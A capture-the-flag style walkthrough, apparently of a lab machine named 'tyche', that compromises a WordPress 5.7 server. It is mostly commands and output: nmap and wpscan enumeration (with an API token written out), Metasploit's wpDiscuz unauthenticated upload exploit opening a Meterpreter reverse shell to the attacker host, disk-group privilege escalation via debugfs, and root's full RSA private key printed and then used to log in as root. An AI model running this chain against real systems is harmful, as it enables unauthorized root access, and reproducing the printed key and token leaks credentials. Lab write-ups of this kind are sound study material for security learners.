## NMAP
```
nmap -sCV -p- -A -T4 10.10.110.119
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-14 09:00 PDT
Nmap scan report for 10.10.110.119
Host is up (0.079s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 058ec4bc0f22b1831e4fde2c3724cfcd (ECDSA)
|_  256 210bb8433b7a6341546f078826a3613c (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-generator: WordPress 5.7
|_http-title: Genesis Security &#8211; All things Genesis
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 136.50 seconds
```
There is a wordpress site

## WP Scan
```
wpscan --url http://10.10.110.119 --api-token 51vO4v72sy7CxiqSaaIMsSH6V6SHKlPNmrmg7vcydB8 -e at,ap --plugins-detection mixed -t 64
```
running Metasploit Scanner we find Discus is running
```
msf6 auxiliary(scanner/http/wordpress_scanner) > exploit

[*] Trying 10.10.110.119
[+] 10.10.110.119 - Detected Wordpress 5.7
[*] 10.10.110.119 - Enumerating Themes
[*] 10.10.110.119 - Progress  0/2 (0.0%)
[*] 10.10.110.119 - Finished scanning themes
[*] 10.10.110.119 - Enumerating plugins
[*] 10.10.110.119 - Progress   0/59 (0.0%)
[+] 10.10.110.119 - Detected plugin: wpdiscuz version 7.0.4
[*] 10.10.110.119 - Finished scanning plugins
[*] 10.10.110.119 - Searching Users
[*] 10.10.110.119 - Was not able to identify users on site using /wp-json/wp/v2/users
[*] 10.10.110.119 - Finished all scans
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
```
msf6 exploit(unix/webapp/wp_wpdiscuz_unauthenticated_file_upload) > exploit

[*] Started reverse TCP handler on 10.10.14.21:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[+] Payload uploaded as ONvBDa.php
[*] Calling payload...
[*] Sending stage (39927 bytes) to 10.10.110.119
[*] Meterpreter session 1 opened (10.10.14.21:4444 -> 10.10.110.119:46548) at 2023-04-14 09:28:53 -0700
dir
[!] This exploit may require manual cleanup of 'ONvBDa.php' on the target

meterpreter > dir
Listing: /var/www/html/wp-content/uploads/2023/04
=================================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  1116  fil   2023-04-14 09:27:55 -0700  ONvBDa-1681489675.1605.php

meterpreter > dir
Listing: /var/www/html/wp-content/uploads/2023/04
=================================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  1116  fil   2023-04-14 09:27:55 -0700  ONvBDa-1681489675.1605.php

meterpreter > 
```
## Shell
```
meterpreter > shell -t
[*] env TERM=xterm HISTFILE= /usr/bin/script -qc /bin/bash /dev/null
Process 115652 created.
Channel 0 created.
ekat@tyche:/var/www/html/wp-content/uploads/2023/04$ 
```
## ID
```
id
uid=1000(ekat) gid=1000(ekat) groups=1000(ekat),6(disk)
ekat@tyche:/var/www/html/wp-content/uploads/2023/04$ 
```
## Enumerating Disks
```
ekat@tyche:/var/www/html/wp-content/uploads/2023/04$ find /dev -group disk
find /dev -group disk
/dev/btrfs-control
/dev/sda3
/dev/sda2
/dev/sda1
/dev/sda
/dev/sg0
/dev/loop7
/dev/loop6
/dev/loop5
/dev/loop4
/dev/loop3
/dev/loop2
/dev/loop1
/dev/loop0
/dev/loop-control
ekat@tyche:/var/www/html/wp-content/uploads/2023/04$ df. h
df. h
Command 'df.' not found, did you mean:
  command 'dfc' from deb dfc (3.1.1-1)
  command 'df' from deb coreutils (8.32-4.1ubuntu1)
Try: apt install <deb name>
ekat@tyche:/var/www/html/wp-content/uploads/2023/04$ df -h
df -h
Filesystem      Size  Used Avail Use% Mounted on
/dev/sda2       4.3G  3.6G  639M  86% /
tmpfs           989M     0  989M   0% /dev/shm
tmpfs           198M  1.1M  197M   1% /run
tmpfs           5.0M     0  5.0M   0% /run/lock
```
looks like /dev/sda2 is something to look into
https://vk9-sec.com/disk-group-privilege-escalation/
```
ekat@tyche:/var/www/html/wp-content/uploads/2023/04$ debugfs /dev/sda2
```
```
debugfs:  cd /root
```
We have access to root
```
debugfs:  cd /root/.ssh
```
```
debugfs:  cat id_rsa
cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAyNoc4Nm3k49ojGHYmezv9U9JDNd4rHp3AQP4U0M2p78M3lQ1
0rhgY5c4bZhCKBxiAJ6wW+gEQetzsGD9QHzEOjziBKs2d6fHEV2bT/lF3o5DIilw
oGqysF8OjspcFc0vSdSTL82lNdehBtmFg7P6nxAZqI15xJzWyJBq7XkRxLxVpen8
GG8uUkyLkn+umKCLOJqdh3uSk7XTLid5XFwfwpNm+PEbnoBPrdAeBICRbVdc04e1
SsfdsRknzGUt2etYWRLm+z3ipBFf3qwYVFl/ZM2KTFl+fGEw7vr8AjgFF3is7wxG
FdZvqU2xxG1YL7ZiWV2CBdVkam0fo2WQFK8uvQIDAQABAoIBAF2i2Z21wlCnpcz0
fL9d54yMlvjGpzp5qWsux6FBj4Rqm/w2dBU14bHsOOFW/1ilysaRNJTUOM/mjbun
q8lZoT2pTpFwpGbqL/MXmaWSB5G27vNJMHmI5J824ZmOG5oKW0ZnNOsvSxsr2KVR
2V3KFUf8gInE0wTnPXapZUAqli8J7aQ0FS6992IzqRtoNifwcoSSt0dP/NhZdXrx
tuUByg6bD1cb5km5DTfWlwqStIlE6Tez/2/hkKgey2uG5u7hIwFjwmINpJB/GwUu
cajTG8hjZGsNB8I1UBDbz36EPXZATgYuZFavD3A0sAUDYaXnCIjyIjnyJ5ea7z6R
rQI+wsECgYEA/AULeeeU+q/GMyRTf3uaUcW+uKKT6i5IguNa9QgIzLgTN+W2UKFR
MSGC7AUqbjbTSHCn9TvhQIkoui0uADaIIcfaxpgJy/+gOdeSgP6B6biuO5M0kUwY
RVK7KAgXeT8BGLCHk06ybzvCEux+aOv4BOcHUnW292LCzkQcRjo/8m0CgYEAzAYw
XfQhHHL3Q9nsH21Frqb9i4IMcroEhTfcabqRN/lSsgTVLcvDN3FQlNVV050g3HgD
G6HMpKqHVfLq+hOQPgL9W+M1GwGvWVq3oo1prqD+YU/va6p07IfUvjKWFd3mCRvZ
90QomcSCPhyevBvyU8LEsYTN3edk0PhRoQce+5ECgYBftKq/CKsS6F2kXk83QoFA
PJBJHbR+YkU3L5ADLaHp3J2vxJSP2jMzLT7C0tNiN3/VKrMd9jd8gpns2et2OT9J
VNRIRsSxq8n1LWB9jClZ0MCZ7zUvWG5/JQPeF/SSHtMTxTY3QtOQWmlBNn5q6fGu
Ku4k6n8pQ2AnZMY4BTbzoQKBgQCl/cMMLbtisgaKpZp+VyECX8qY3k3SaZWT7Ube
nnPX3nlxbI0knUtOqFqvPIJ/kK9TsDCXIqSktDk3rFOQ8qnASh5nzAtA1bYcNLqC
/hqlgUZ1Vdus9Rn79ucXd4C0ebzWXFqR2lpOAJsWfaKH2RTnIOd2pl331HMpsV54
bJrAgQKBgQDYpAcCefVGixa0yjDUx0lPqceR6S9z2ybeYt4R6wuE18ru3YPe8LNl
zYWeXj3wGORjBGlkCarGubM1fLbR2U/+Q+oOs8RSn0efWHcRNtPFePRIVTTx1p10
X0awLh0hjhiOGd8+VuqGkN9ablNc+RXHFGvYyY8VYfrlVwcjis2o2Q==
-----END RSA PRIVATE KEY-----
```
## SSH
```
ssh -i id_rsa root@10.10.110.119
The authenticity of host '10.10.110.119 (10.10.110.119)' can't be established.
ED25519 key fingerprint is SHA256:f/TQGSYuormbO8i7TS45KsaXeJwC8LlA3VC5ctM/0tU.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.110.119' (ED25519) to the list of known hosts.
Welcome to Ubuntu 22.04 LTS (GNU/Linux 5.15.0-41-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Apr 14 04:52:15 PM UTC 2023

  System load:  0.1748046875      Processes:               244
  Usage of /:   84.0% of 4.28GB   Users logged in:         0
  Memory usage: 47%               IPv4 address for ens160: 192.168.1.119
  Swap usage:   0%


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Sat Jul 23 05:24:51 2022
root@tyche:~# 
```

